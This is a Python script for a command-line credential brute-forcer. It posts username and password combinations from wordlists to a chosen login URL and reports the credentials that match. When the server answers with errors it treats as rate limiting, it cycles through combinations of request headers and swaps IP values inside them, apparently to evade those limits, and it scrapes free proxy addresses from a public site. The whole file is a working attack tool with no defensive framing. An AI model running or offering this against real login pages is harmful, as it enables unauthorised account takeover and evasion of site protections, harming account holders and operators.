import requests
import threading
from bs4 import BeautifulSoup                                                           
import argparse
import json

def getIPs():
    response = requests.get("https://sslproxies.org/") 
    soup = BeautifulSoup(response.content, 'html5lib') 
    ips = [ip.text for ip in soup.findAll('td')[::8]]
    ports = [port.text for port in soup.findAll('td')[1::8]]
    IPList = [ips[i]+":" + ports[i] for i in range(len(ips))]
    IPList = [proxy for proxy in IPList if proxy[0].isnumeric()]
    print()
    return IPList

class Bruteforce:

    def __init__(self, url, headersList, ipList, idList, passList, isPresent, isAbsent):
        self.url = url
        self.headers = headersList
        self.headerId = 0
        self.ipList = ipList
        self.ipId = 0
        self.idList = idList
        self.passList = passList
        self.isPresent = isPresent
        self.isAbsent = isAbsent

    def sendreq(self, passw, uid):
        resText = ""
        resCode = ""
        try:
            header = json.dumps(self.headers[self.headerId])
            header = header.replace(self.ipList[self.ipId-1], self.ipList[self.ipId])
            header = json.loads(header)
            res=requests.post(self.url,data={
                            "username": uid,
                            "password": passw
                            },json={
                            "username": uid,
                            "password": passw
                            }, headers=self.headers[self.headerId])
            resCode = str(res.status_code)
            resText = res.text
            resTime = res.elapsed.total_seconds()
            if resCode[0] not in ['2', '3']:
                raise Exception("Server Rate limit") 
            with open("bruteforce.log", "a") as f:
                f.write(f"{uid} {passw} tested\n")
                f.write(f"response code - {resCode}, response length - {len(resText)}, response time - {resTime} ")
                f.write("\n.......................\n")
            #print(f"{uid} {passw} tested\n")
        except Exception as e:
            if self.ipId < len(self.ipList):
                self.ipId += 1
            else:
                self.headerId += 1
                self.ipId = 0
            return (False,None,None)
        
        if resText and ((self.isPresent and self.isPresent in resText) or (self.isAbsent and self.isAbsent not in resText)):
            print("uid-",uid)
            print("pass-",passw)
            return (True,uid,passw)
        
        return (True,None,None)

    def bruteforce(self):
        for uid in self.idList:
            T = []
            for passw in self.passList:
                response = self.sendreq(passw, uid)
                while not response[0] and self.headerId > len(self.headers):
                    response = self.sendreq(passw, uid)
                if self.headerId > len(self.headers):
                    print("Not possible with 2 headers")
                    return 

def combineHeaders(headers):
    keys = list(headers.keys())
    l = len(keys)
    headerComb = []
    for i in range(1 << l):
        headerKeySet = [keys[j] for j in range(l) if (i & (1 << j))]
        tempHeader = {}
        for h in headerKeySet:
            tempHeader[h] = headers[h]
        headerComb.append(tempHeader)
    return headerComb

def readListFiles(fileName):
    with open(fileName, "r") as f:
        items = f.readlines()
        items = [item[:-1] for item in items]
        return items

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-u',
                         action='store',
                         required=True,
                         help='bruteforce url')
    parser.add_argument('--headers-file', '-hf',
                         action='store',
                         required=True,
                         help='The file consisting of all the required headers')
    passwords_group = parser.add_mutually_exclusive_group(required=True)
    passwords_group.add_argument('--password', '-p',
                                 action='store',
                                 help='single password')
    passwords_group.add_argument('--password-file', '-pf',
                                 action='store',
                                 help='path to passwords file')
    ids_group = parser.add_mutually_exclusive_group(required=True)
    ids_group.add_argument('--id', '-i',
                           action='store',
                           help='single id')
    ids_group.add_argument('--id-file', '-if',
                           action='store',
                           help='path to ids file')
    identifier_group = parser.add_mutually_exclusive_group(required=True)
    identifier_group.add_argument('--is-present', '-ip',
                                 action='store',
                                 help='if present in response terminates the bruteforce')
    identifier_group.add_argument('--is-not-present', '-inp',
                                 action='store',
                                 help='value if not present in response terminates the bruteforce')
    options = parser.parse_args()
    
    with open("bruteforce.log", "w") as f:
        f.write("")
    
    url = options.url
    with open(options.headers_file, 'r') as f:
        headers = json.loads(f.read())
    headerCombinations = combineHeaders(headers)
    passwords = []
    ids = []
    if options.password:
        passwords = [options.password]
    else:
        passwords = readListFiles(options.password_file)
    
    if options.id:
        ids = [options.id]
    else:
        ids = readListFiles(options.id_file)
    isPresent = options.is_present 
    isNotPresent = options.is_not_present
    Bruteforce(url=url, headersList=headerCombinations, ipList=["127.0.0.1"],
               idList=ids, passList=passwords, isPresent=isPresent, isAbsent=isNotPresent).bruteforce()



if __name__=="__main__":
    main()
 